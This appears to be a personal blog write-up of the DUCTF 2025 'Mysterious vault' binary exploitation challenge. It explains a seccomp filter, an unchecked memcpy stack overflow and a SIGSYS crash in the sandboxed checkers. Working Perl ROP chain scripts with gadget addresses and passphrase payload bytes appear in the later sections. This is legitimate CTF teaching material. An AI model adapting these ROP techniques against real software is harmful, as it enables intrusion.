@@ -1,0 +1,640 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<link rel="stylesheet" href="../../style.css">
+<title>Blog</title>
+</head>
+
+<body>
+<p><a href="/">&#8592; Back</a>
+</p>
+
+<img class="header" alt="header" src="img/banner.jpg"
+width="100%">
+
+<div style="float: right;">
+<p> 22/07/25 </p>
+</div>
+
+<p>justme10101</p>
+
+<h1>SIGSYS madness &#8212; Mysterious vault, DUCTF 2025</h1>
+
+<blockquote>
+  <p>You've discovered a mysterious vault exposed on a server -
+surely, if you can break in, great rewards will follow...</p>
+</blockquote>
+
+<p>Given <strong>mysterious-vault.zip</strong>:</p>
+
+<pre>
+.
+└── mysterious-vault
+    ├── Dockerfile
+    ├── checker1-trusted-env
+    │   └── password
+    ├── checker2-trusted-env
+    │   └── password
+    ├── flag.txt
+    ├── mysterious_vault
+    ├── mysterious_vault.c
+    ├── nsjail.cfg
+    ├── password_handler_3000
+    ├── password_handler_3001
+    └── password_handler_300X.c
+</pre>
+
+<p>Directory contains:</p>
+
+<ul>
+<li><strong>Dockerfile</strong> to run task locally</li>
+<li><strong>nsjail.cfg</strong> &#8212; Google's <a href="https://github.com/google/nsjail.git">nsjail</a> configuration file</li>
+<li><strong>mysterious_vault</strong> &#8212; 64-bit Linux ELF, dynamically linked</li>
+<li><strong>password_handler_3000</strong>, <strong>password_handler_3001</strong> &#8212; 64-bit Linux
+ELF, statically linked</li>
+<li><strong>checker1-trusted-env/</strong>, <strong>checker2-trusted-env/</strong> &#8212; as the name
+suggests, trusted environments for password checkers. My guess
+is that <strong>password_handler_300*</strong> programs will be executed
+in there using <code>chroot(2)</code> system call</li>
+<li><strong>flag.txt</strong> &#8212; the flag itself. It's just a stub, the real flag
+of course is on the server</li>
+</ul>
+
+<hr>
+
+<p>I have very limited experience with Docker, that's why I decided
+to create chroot jail manually myself.  Even though I am using
+Alpine Linux, dynamically linked executable runs just fine
+thanks to gcompat.  I'd downloaded mini root filesystem from
+<a href="https://alpinelinux.org/downloads/">Alpine</a>'s website and
+copied all the necessary files according to Dockerfile.</p>
+
+<pre>
+# curl -LO https://dl-cdn.alpinelinux.org/alpine/v3.22/releases/x86_64/alpine-minirootfs-3.22.1-x86_64.tar.gz
+# mkdir _chroot
+# tar -xzf alpine-minirootfs-3.22.1-x86_64.tar.gz -C _chroot
+# mount -t proc proc _chroot/proc
+# mount -o bind /run _chroot/run
+# mount -o bind /sys _chroot/sys
+# mkdir -p _chroot/home/ctf
+# cp -v mysterious_vault _chroot/home/ctf
+# cp -v password_handler_300* _chroot/home/ctf
+# cp -vR checker{1,2}-trusted-env _chroot/home/ctf
+# chroot _chroot /bin/sh
+# adduser ctf
+# chown -R ctf:ctf /home/ctf
+# su ctf
+$ cd
+$ head -1 /etc/os-release
+NAME="Alpine Linux"
+</pre>
+
+<h2>Broken challenge?</h2>
+
+<p>Executable produced an error:</p>
+
+<pre>
+$ ./mysterious_vault
+ERROR. CRITICAL ERROR FOR `shmid`. PLEASE CONTACT ADMINISTRATIVE ENTITIES 
+</pre>
+
+<p>In <code>setup()</code> function of <strong>mysterious_vault.c</strong> there is
+<code>shmget(2)</code> syscall, which creates shared memory segment. 
+It is generally used for inter-process communication.</p>
+
+<pre>
+int shmid = shmget(0xdeadbeef, 0x20, IPC_CREAT);
+if (shmid < 0) {
+    fprintf(stderr, "ERROR. CRITICAL ERROR FOR `shmget`. PLEASE CONTACT ADMINISTRATIVE ENTITIES\n");
+    exit(1);
+}
+</pre>
+
+<p>Apparently my user doesn't have privileges to create this
+segment.  As stated in <code>shmget(2)</code>, <strong>EACCESS</strong> is returned if
+caller doesn't have <strong>CAP_IPC_OWNER</strong> capability.  Once started as
+root, everything works just fine:</p>
+
+<pre>
+# ./mysterious_vault
+ACCESS REQUIRED. ENTER USERNAME: aaaa
+ENTER PASSCODE: aaaa
+AUTHENTICATING.
+SPAWNING CHECKER 0x1
+SPAWNING CHECKER 0x2
+PASSWORD CHECKER HAS FAILED. THE VAULT SHALL REMAIN CLOSED.
+</pre>
+
+<p>It asks for username and password, then does internal checks.</p>
+
+<p>Program creates two child processes from
+<strong>password_handler_3000</strong> and <strong>password_handler_3001</strong>
+accordingly, using <code>fork(2)</code> and <code>execve(2)</code>.  It also changes
+root directory via <code>chroot(2)</code> prior to executing, thus ensuring
+children won't touch anything outside trusted environment.  That's
+exactly why they are statically linked &#8212; there is no
+<strong>/usr/lib</strong>.</p>
+
+<p>I found it strange that password checker has failed, sounds like
+program has crashed. And indeed, here is the check in
+<strong>mysterious_vault</strong>'s <code>main()</code>:</p>
+
+<pre>
+while ((wpid = wait(&amp;status)) > 0) {
+    if (WIFEXITED(status)) {
+            if (WEXITSTATUS(status) != 0) {
+                        printf("PASSWORD CHECKER HAS FAILED. THE VAULT SHALL REMAIN CLOSED.\n");
+                        exit(1);
+                }
+        }
+        else {
+            printf("PASSWORD CHECKER HAS FAILED. THE VAULT SHALL REMAIN CLOSED.\n");
+            exit(1);
+        }
+}
+</pre>
+
+<p>Message is printed if child's exit status is not <strong>EXIT_SUCCESS</strong>. 
+In the end of <code>main()</code> in <strong>password_handler_300X.c</strong> I saw
+this check:</p>
+
+<pre>
+    if (strcspn(password, "password") != strlen(password)) {
+            exit(1);
+    }
+
+    return 0;
+}
+</pre>
+
+<p>Basically, if password contains any of
+'<em>p</em>','<em>a</em>','<em>s</em>','<em>w</em>','<em>o</em>','<em>r</em>','<em>d</em>' characters, child
+exits with code 1, which causes "<em>PASSWORD CHECKER HAS FAILED</em>"
+error message to be printed.  I'd tried '<em>yyy</em>' string, but to
+my surprise &#8212; got the same result.  This means
+<code>WIFEXITED()</code> is failing.  From <code>wait(2)</code>:</p>
+
+<blockquote>
+  <p>returns true if child terminated normally, that is, by calling
+exit(3) or _exit(2), or by returning from main()</p>
+</blockquote>
+
+<p>Maybe child's being crashed because of my environment, gcompat
+and stuff?  I recompiled all binaries from source to make native
+copies, ran it again and got the same result again.  Weird.  At
+this moment I honestly thought that this challenge is in fact
+broken.  Does it work on server?</p>
+
+<pre>
+$ nc chal.2025.ductf.net 30019
+ACCESS REQUIRED. ENTER USERNAME: jjj
+ENTER PASSCODE: jjj
+AUTHENTICATING.
+SPAWNING CHECKER 0x1
+SPAWNING CHECKER 0x2
+PASSWORD CHECKER HAS FAILED. THE VAULT SHALL REMAIN CLOSED.
+</pre>
+
+<p>Well, it doesn't.</p>
+
+<h2>SIGSYS mystery</h2>
+
+<p>I've rebuilt child with <strong>-g -O0</strong> flags to step through it in
+<code>gdb(1)</code>.  Unfortunately, by default gdb doesn't attach to child
+process after <code>fork(2)</code>.  With a bit of googling I found out
+'follow-fork-mode' setting is responsible for that.  When set to
+'child', gdb detaches from parent and attaches to child process
+after forking.  In combination with <strong>catch exec</strong> it makes
+possible to catch <code>execve(2)</code> syscalls as well.</p>
+
+<p>
+<img alt="SIGSYS" src="img/sigsys.png">
+</p>
+
+<p><strong>SIGSYS</strong> signal raises when process is trying to execute
+an illegal syscall.  I quickly searched the web to find most
+popular causes of <strong>SIGSYS</strong> in Linux environment, but none of
+them were my case.  I single-stepped through source, and it seems
+that program catches <strong>SIGSYS</strong> in the very end of <code>main()</code>.  More
+specifically, in <code>_Exit(2)</code> internal libc function.  Here is how
+it looks like in my case:</p>
+
+<pre>
+gef> disas _Exit
+Dump of assembler code for function _Exit:
+=> 0x00007ffff7f9ac37 <+0>: movsxd rdi,edi
+   0x00007ffff7f9ac3a <+3>: mov    eax,0xe7
+   0x00007ffff7f9ac3f <+8>: syscall
+</pre>
+
+<p><strong>edi</strong> gets sign-extended to <strong>rdi</strong>, then <strong>eax</strong> (system call
+table index) is set to <strong>0xe7</strong>, which corresponds to
+<a href="https://syscalls.mebeim.net/?table=x86/64/x64/latest">exit_group(2)</a>
+syscall.</p>
+
+<blockquote>
+  <p>This system call terminates all threads in the calling process's
+thread group.</p>
+</blockquote>
+
+<p>Seems pretty legal(?) to me.</p>
+
+<h2>__stdio_exit() rabbit hole</h2>
+
+<p>I've built a simple program with
+empty <code>main()</code> just to see what happens after returning in detail:</p>
+
+<ol>
+<li>Execution flow returns to <code>libc_start_main_stage2()</code></li>
+<li><code>libc_start_main_stage2()</code> retrieves exit code and passes it to
+<code>exit(3)</code></li>
+<li><code>exit(3)</code> calls following functions in that exact order:
+<ul>
+<li><code>__funcs_on_exit()</code></li>
+<li><code>__libc_exit_fini()</code></li>
+<li><code>__stdio_exit()</code></li>
+<li><code>_Exit(2)</code></li>
+</ul></li>
+</ol>
+
+<p>I remembered that <strong>password_handler_300*</strong> locks itself by
+closing stdin, stdout and stderr descriptors.  <code>__stdio_exit()</code>
+then tries to close them once again:</p>
+
+<pre>
+void __stdio_exit(void)
+{
+    FILE *f;
+    for (f=*__ofl_lock(); f; f=f->next) close_file(f);
+    close_file(__stdin_used);
+    close_file(__stdout_used);
+    close_file(__stderr_used);
+}
+</pre>
+
+<p>Trying to close already closed fds sounds wacky, so <code>close(2)</code>
+syscall might fail with some error code, which gets eventually
+transferred all over to <code>exit_group(2)</code>. This error code can
+potentially be value, which is equal to <strong>SIGSYS</strong>.</p>
+
+<p>I found out this isn't true though, because even if
+<code>close_file()</code> and underlying <code>close(2)</code> in <code>__stdio_exit()</code>
+fails, it doesn't return anything anyway, thus doesn't trash
+<strong>rdi</strong>.  I honestly don't know why I though it does.</p>
+
+<h2>Secure computing</h2>
+
+<p>I was looking at <strong>password_handler_300X.c</strong> for a while and
+searching the web with prompts like '<em>&lt;function I don't know
+about&gt; SIGSYS Linux</em>'.  Eventually I've stumped upon
+<a href="https://www.man7.org/linux/man-pages/man2/seccomp.2.html">seccomp(2)</a>.</p>
+
+<pre>
+if (prctl(PR_SET_SECCOMP, 2, &amp;prog)) {     
+    fprintf(stderr, "ERROR. CRITICAL ERROR WHEN LOCKING DOWN CHECKER. PLEASE CONTACT ADMINISTRATIVE ENTITIES.\n");
+        exit(1);
+}
+</pre>
+
+<p>From <code>prctl(2)</code>:</p>
+
+<blockquote>
+  <p>prctl() manipulates various aspects of the behavior of the calling
+thread or process.</p>
+</blockquote>
+
+<p>2 is define of <strong>SECCOMP_MODE_FILTER</strong> &#8212; user-supplied
+filter, which specifies what syscalls is program able to use. 
+That's exactly the problem &#8212; if <code>exit_group(2)</code> is blocked in
+filter, program gets crashed on exit.  From <code>seccomp(2)</code>:</p>
+
+<blockquote>
+  <p>Caveats</p>
+
+<p>Seccomp filtering is based on system call numbers.  However,
+applications typically do not directly invoke system calls, but
+instead call wrapper functions in the C library which in turn
+invoke the system calls.  Consequently, one must be aware of
+the following:</p>
+
+<p>The glibc wrappers for some traditional system calls may
+actually employ system calls with different names in the
+kernel.  For example, the exit(2) wrapper function actually
+employs the exit_group(2) system call, and the fork(2)
+wrapper function actually calls clone(2).</p>
+</blockquote>
+
+<p>Filter is passed as an obfusctaed string containing hex values
+(<strong>filter_bytes</strong>).  It's <em>Berkeley Packet Filter</em> program. 
+Several tools exist to dump that, for example
+<a href="https://github.com/david942j/seccomp-tools.git">this</a>:</p>
+
+<pre>
+$ echo -ne "\x20\x00\x00\x00\x04\x00\x00\x00\x15\x00\x00\x08\x3e\x00\x00\xc0\x20\x00\x00\x00\x00\x00\x00\x00\x35\x00\x00\x01\x00\x00\x00\x40\x15\x00\x00\x05\xff\xff\xff\xff\x15\x00\x03\x00\x00\x00\x00\x00\x15\x00\x02\x00\x01\x00\x00\x00\x15\x00\x01\x00\x3c\x00\x00\x00\x15\x00\x00\x01\x02\x00\x00\x00\x06\x00\x00\x00\x00\x00\xff\x7f\x06\x00\x00\x00\x00\x00\x00\x00" > seccomp.bpf
+$ seccomp-tools disasm seccomp.bpf 
+ line  CODE  JT   JF      K
+=================================
+0000: 0x20 0x00 0x00 0x00000004  A = arch
+0001: 0x15 0x00 0x08 0xc000003e  if (A != ARCH_X86_64) goto 0010
+0002: 0x20 0x00 0x00 0x00000000  A = sys_number
+0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
+0004: 0x15 0x00 0x05 0xffffffff  if (A != 0xffffffff) goto 0010
+0005: 0x15 0x03 0x00 0x00000000  if (A == read) goto 0009
+0006: 0x15 0x02 0x00 0x00000001  if (A == write) goto 0009
+0007: 0x15 0x01 0x00 0x0000003c  if (A == exit) goto 0009
+0008: 0x15 0x00 0x01 0x00000002  if (A != open) goto 0010
+0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW
+0010: 0x06 0x00 0x00 0x00000000  return KILL
+</pre>
+
+<p>And indeed, only <code>read(2)</code>, <code>write(2)</code>, <code>exit(2)</code> and <code>open(2)</code>
+syscalls are allowed.  Even to reach password checking part, I
+need to call <code>exit(2)</code> to exit gracefully. That's totally not
+what I was expecting.</p>
+
+<h2>Bug discovery</h2>
+
+<p>In order to perform further checks, <strong>password_handler_300X.c</strong>
+copies password from shared memory to local storage on stack:</p>
+
+<pre>
+char password[200] = {0};
+int passwd_len = 0;
+
+passwd_len = *((int*)(SHARED_ADDR+4));
+memcpy(password, (char*)SHARED_ADDR+8, passwd_len);
+*((int*)SHARED_ADDR) += 1;
+</pre>
+
+<p>This <code>memcpy(3)</code> call immediately caught my eye.  There are no
+checks against password length, so when password is bigger than
+200 bytes, there is an obvious stack overflow.  Given binary was
+compiled with <strong>-fno-stack-protector</strong>, meaning no stack canary.  It's
+statically linked with static base address <strong>0x400000</strong>, meaning ROP
+is more than possible.</p>
+
+<p>I've recompiled my MUSL binaries to make them static and
+explicitly set base:</p>
+
+<pre>
+password_handler_300%: password_handler_300X.c
+    echo $@ | grep -q 'X.c' || cc -static -static-libgcc -static-libstdc++ -Wl,--image-base=0x400000 $(CFLAGS) -o $@ $<
+</pre>
+
+<p><em>^^^ Don't mind ugly grep(1) hack, I'm just too lazy to figure out
+how to filter out password_handler_300X.c from Make targets.</em>
+
+<p>Password displacement on stack is <strong>rbp - 0xe0</strong>, as can be seen in
+binary:</p>
+
+<p>
+<img alt="memcpy" src="img/memcpy.png">
+</p>
+
+<p><strong>rbp</strong> gets pushed to stack in prologue, so return address is
+at <strong>rbp + 8</strong>, meaning <strong>0xe0 + 8</strong> bytes are needed to reach
+that.</p>
+
+<h2>read(2) vs world</h2>
+
+<p>The problem is that program is using <code>read(2)</code> instead of
+<code>fgets(3)</code> or similar libc functions, so it reads until EOF, not
+until '<em>\n</em>'.  Multiple lines from input pipe would be
+considered as one line which has '<em>\n</em>' in it.  I found out
+FIFO and script can be used to produce right behaviour.</p>
+
+<pre>
+#!/bin/sh
+echo line1
+echo line2
+</pre>
+
+<pre>
+$ [ ! -p /tmp/p ] && mkfifo /tmp/p
+$ chmod +x ./script.sh && ./script.sh > /tmp/p &
+$ su
+# gdb --command=start.gdb -q ./mysterious_vault
+# (gdb) r < /tmp/p
+</pre>
+
+<h2>Beating password_handler_3000</h2>
+
+<p>Using <a href="https://hugsy.github.io/gef/">gef</a> I found convenient
+<code>exit(2)</code> syscall in <strong>password_handler_3000</strong> original binary:</p>
+
+<p>
+<img alt="found" src="img/found.png">
+</p>
+
+<p>Lucky me, it zeroes out <strong>edi</strong>, so I don't need to do that myself
+in ROP chain. Simple perl script to test overflow:</p>
+
+<pre>
+#!/usr/bin/perl
+print(
+    'q'x(0xe0+8) .
+    pack('Q',0x401ffa));
+</pre>
+
+<p>Still crashes, but this time in <strong>password_checker_3001</strong>.  I
+thought they were compiled from the same source, therefore
+are equal, but they differ in size:</p>
+
+<p>
+<img alt="sizes" src="img/sizes.png">
+</p>
+
+<p>First one is twice bigger than second.  I found out they were
+compiled using different compilers, <em>gcc</em> and <em>clang</em> accordingly. 
+I replaced <strong>3001</strong> one with <strong>3000</strong> temporarily just to see if
+I managed to ROP into <code>exit(2)</code> in at least first one:</p>
+
+<pre>
+# ./mysterious_vault < /tmp/p
+ACCESS REQUIRED. ENTER USERNAME: ENTER PASSCODE: AUTHENTICATING.
+SPAWNING CHECKER 0x1
+SPAWNING CHECKER 0x2
+DENIED. THE VAULT SHALL REMAIN CLOSED FOR ALL OF ETERNITY.
+</pre>
+
+<p>
+<img alt="yui" src="img/yui.gif">
+</p>
+
+<h2>Beating password_handler_3001</h2>
+
+<p>Password is stored in <strong>mysterious_vault.c</strong> in a define:</p>
+
+<pre>
+#define CORRECT_PASSPHRASE "\x31\xd2\x48\x8d\x35\x1c\x00\x00\x00\x80\xfa\x1b\x7d\x0a\x80\x36\x42\xfe\xc2\x48\xff\xc6\xeb\xf1\xbf\x01\x00\x00\x00\x48\x29\xd6\x89\xf8\x0f\x05\xc3\x1b\x2d\x37\x62\x24\x2d\x37\x2c\x26\x62\x36\x2a\x27\x62\x27\x23\x31\x36\x27\x30\x62\x27\x25\x25\x62\x78\x6b"
+</pre>
+
+<p>Can't be that easy, right?  It just lies in <code>.rodata</code> as is.  I
+thought that this password is different on server, that's why I
+should leak it somehow.  I started to dig into <code>chroot(2)</code> man
+page and search for caveats, but didn't find anything
+interesting.</p>
+
+<p>When process executes <code>execve(2)</code>, it's running image gets
+replaced with a new one.  Maybe there are some optimizations in
+kernel, which cause some virtual memory to be preserved, e.g. 
+in case new <code>.rodata</code> section size is less than old <code>.rodata</code>. 
+But even if it is like that, <strong>password_handler_300*</strong>
+<code>.rodata</code> is obviosly greater than parent's because they are
+statically linked.</p>
+
+<p>I decided to make an assumption, that <strong>CORRECT_PASSPHRASE</strong> on
+server is exactly the same as in <strong>mysterious_vault.c</strong> for
+now, to figure out what's the deal with
+<strong>password_handler_3001</strong>.</p>
+
+<p>I opened it in Ghidra, located "<em>password</em>" string from <code>main()</code>
+and figured out the password buffer offset on stack is now
+different:</p>
+
+<p>
+<img alt="offset" src="img/offset.png">
+</p>
+
+<p>It is now <strong>rbp - 0xd0</strong> instead of <strong>rbp - 0xe0</strong>. So new exploit
+layout should look like this:</p>
+
+<p>
+<img alt="ill" src="img/ill.png" width="60%">
+</p>
+
+<p>Unfortunately, I didn't find any "shortcuts", that's why ROP
+chain needs to set <strong>rdi</strong>, <strong>rax</strong> and jump to syscall
+instruction.  Before that &#8212; it should pop 2 values from
+stack, which are 8 bytes of padding and
+<strong>password_handler_3000</strong> <code>main()</code> return address.</p>
+
+<pre>
+#!/usr/bin/perl
+print(
+        # padding
+        'q'x(0xd0+8) .
+        # [3001] -> pop r14; pop r15; ret
+        pack('Q', 0x421b41) .
+        # padding
+        'q'x8 .
+        # [3000] -> exit(0)
+        pack('Q',0x401ffa) .
+        # [3001] -> pop rdi; ret
+        pack('Q', 0x421b44) .
+        pack('Q', 0x0) .
+        # [3001] -> pop rax; ret
+        pack('Q', 0x41dc79) .
+        pack('Q', 0x3c) .
+        # [3001] -> syscall
+        pack('Q', 0x401a32) );
+</pre>
+
+<h2>Shifted passphrase</h2>
+
+<p>Last part is to satisfy <code>memcmp(3)</code> at the very end of <code>main()</code>
+in <strong>mysterious_vault.c</strong>.  I replaced first part of padding
+with <strong>CORRECT_PASSPHRASE</strong>, but that didn't work.  Here are the
+contents of source and destination buffers passed to final
+<code>memcmp(3)</code>:</p>
+
+<p>
+<img alt="hd" src="img/hd.png">
+</p>
+
+<p>It's clear that passphrase is shifted to right in my case.
+That's because <strong>*SHARED_ADDR</strong> is used for synchronization between
+children, and <strong>*(SHARED_ADDR + 1)</strong> is for password length. I got
+rid of first 8 bytes in <code>print()</code> in my script, so it prints the rest. The only
+problem now &#8212; how to overwrite first 8 bytes of <strong>SHARED_ADDR</strong>?</p>
+
+<p>ROP needs some gadget to write arbitrary 8 byte vaule into
+arbitrary location, preferably specified by register.  After a
+couple of minutes in Ghidra I found this:</p>
+
+<pre>
+0041a1b8 48 89       MOV      qword ptr [RBP + -0x10]=>local_18, RSI
+0041a1bc 48 8b       MOV      RAX, qword ptr [RBP + -0x8]=>local_10
+0041a1c0 48 6b       IMUL     RCX, qword ptr [RBP + -0x10]=>local_18, 0x18
+0041a1c5 48 01 c8    ADD      RAX, RCX
+0041a1c8 5d          POP      RBP
+0041a1c9 c3          RET
+</pre>
+
+<p>Sure, it trashes <strong>rcx</strong>, <strong>rax</strong> and <strong>rbp</strong> registers, but I
+don't care about it in this case.  <strong>rbp - 0x10</strong> must be set to
+destination address and <strong>rsi</strong> is the value to write.  Value
+should be <code>0x00001c358d48d231</code> (first 8 bytes of password in
+reverse order).</p>
+
+<pre>
+#!/usr/bin/perl
+
+print("\x00\x80\xfa\x1b\x7d\x0a\x80\x36\x42\xfe\xc2\x48\xff\xc6\xeb\xf1\xbf\x01\x00\x00\x00\x48\x29\xd6\x89\xf8\x0f\x05\xc3\x1b\x2d\x37\x62\x24\x2d\x37\x2c\x26\x62\x36\x2a\x27\x62\x27\x23\x31\x36\x27\x30\x62\x27\x25\x25\x62\x78\x6b");
+print("q"x(0xd0-0x40+8+8));
+
+my @rop_chain = (
+        # [3001] -> pop r14; pop r15; ret
+        # --- 0xd0 + 8 ---
+        0x41d280,
+        # padding until -0xe0 + 8
+        0x0,
+        # --- 0xe0 + 8 ---
+        # [3000] -> exit(0)
+        0x401ffa,
+        # [3001] -> pop rbp; ret
+        0x41a1c8,
+        0x1337000 + 0x10, # rbp + 0x10
+        # [3001] -> pop rsi
+        0x41d163,
+        0x00001c358d48d231, # 2; length
+        # [3001] vvvvvvvvvvvvvvvvvvvvvvvvvv
+        # mov    QWORD PTR [rbp-0x10],rsi
+        # mov    rax,QWORD PTR [rbp-0x8]
+        # imul   rcx,QWORD PTR [rbp-0x10],0x18
+        # add    rax,rcx
+        # pop    rbp
+        # ret
+        0x41a1b8,
+        0x0,        # rbp
+        # [3001] -> pop rax; ret
+        0x41dc79,
+        0x3c,
+        # [3001] -> pop rdi; ret
+        0x41d282,
+        0x00,
+        # [3001] -> syscall
+        0x401a32 );
+
+foreach my $idd (@rop_chain) {
+    print(pack('Q', $idd));
+}
+</pre>
+
+<p>Eventually, I got successfully pwned this one on server:</p>
+
+<p>
+<img alt="final" src="img/final.png">
+</p>
+
+<p>Flag: <code>DUCTF{pushing_and_popping_and_so_on_and_so_forth}</code>
+
+<h2>Additional: debug using Docker with gdbserver and gdb on host</h2>
+
+<pre>
+--- a/Dockerfile
++++ b/Dockerfile
+@@ -9,3 +9,9 @@
+ COPY ./password_handler_300* /home/ctf/chal
+ COPY ./checker1-trusted-env/ /home/ctf/chal/checker1-trusted-env
+ COPY ./checker2-trusted-env/ /home/ctf/chal/checker2-trusted-env
++
++EXPOSE 9999
++RUN apt update && apt install gdbserver
++WORKDIR /home/ctf/chal
++
++CMD [ "gdbserver", ":9999", "./pwn" ]
+</pre>
+</body>
+</html>
